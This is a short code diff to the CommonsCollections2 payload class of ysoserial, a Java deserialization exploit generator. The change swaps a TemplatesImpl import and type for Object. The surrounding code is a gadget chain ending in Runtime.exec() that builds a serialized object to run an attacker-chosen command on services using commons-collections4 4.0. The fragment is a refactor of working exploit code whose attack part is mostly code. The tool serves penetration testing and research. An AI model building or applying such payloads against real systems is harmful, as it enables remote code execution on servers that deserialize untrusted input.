@@ -11,7 +11,6 @@ import ysoserial.payloads.util.Gadgets;
 import ysoserial.payloads.util.PayloadRunner;
 import ysoserial.payloads.util.Reflections;
 
-import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
 
 /*
 	Gadget chain:
@@ -24,12 +23,12 @@ import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
 								Runtime.exec()
  */
 
-@SuppressWarnings({ "rawtypes", "unchecked", "restriction" })
+@SuppressWarnings({ "rawtypes", "unchecked" })
 @Dependencies({"org.apache.commons:commons-collections4:4.0"})
 public class CommonsCollections2 implements ObjectPayload<Queue<Object>> {
 
 	public Queue<Object> getObject(final String command) throws Exception {
-		final TemplatesImpl templates = Gadgets.createTemplatesImpl(command);
+		final Object templates = Gadgets.createTemplatesImpl(command);
 		// mock method name until armed
 		final InvokerTransformer transformer = new InvokerTransformer("toString", new Class[0], new Object[0]);
 
